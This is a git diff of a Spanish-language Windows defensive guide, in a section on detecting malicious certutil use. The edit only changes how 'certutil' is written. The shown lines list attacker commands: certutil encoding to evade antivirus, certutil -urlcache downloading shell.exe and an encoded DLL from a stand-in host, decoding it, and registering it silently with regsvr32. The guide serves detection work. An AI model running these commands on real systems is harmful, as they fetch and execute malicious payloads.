@@ -2628,7 +2628,7 @@ net accounts
 
 ### ▶️ Detectar técnicas maliciosas realizadas a través de "certutil"
 
-El comando "certutil" puede ser utilizado por un actor malicioso para realizar diversas acciones maliciosas. Es una buena postura de seguridad configurar reglas preventivas y alertas para detectar estas técnicas.
+El comando "certutil.exe" puede ser utilizado por un actor malicioso para realizar diversas acciones maliciosas. Es una buena postura de seguridad configurar reglas preventivas y alertas para detectar estas técnicas.
 
 Ofuscación: Codifica y descodifica ficheros a través de certutil, evitando así la detección por motores antimalware en un primer análisis estático del fichero. 
 ```cmd
@@ -2638,12 +2638,12 @@ certutil -decode .\bypass.txt malware.exe
 
 Descarga de ficheros desde una dirección URL a local a través de certutil.
 ```cmd
-certutil.exe -urlcache -split -f https://domain.com/shell.exe shell.exe
+certutil -urlcache -split -f https://domain.com/shell.exe shell.exe
 ```
 
 Descarga de una dll maliciosa ofuscada previamente en un formato txt, decodifica y convierte la dll maliciosa a un formato de librería dll, con regsvr32 registra en modo silencioso la librería dll en el sistema.
 ```cmd
-certutil.exe -urlcache -split -f https://domain.com/evildll.txt evildll.txt
+certutil -urlcache -split -f https://domain.com/evildll.txt evildll.txt
 certutil -decode .\evildll.txt evildll.dll
 regsvr32 /s /u .\evildll.dll
 ```
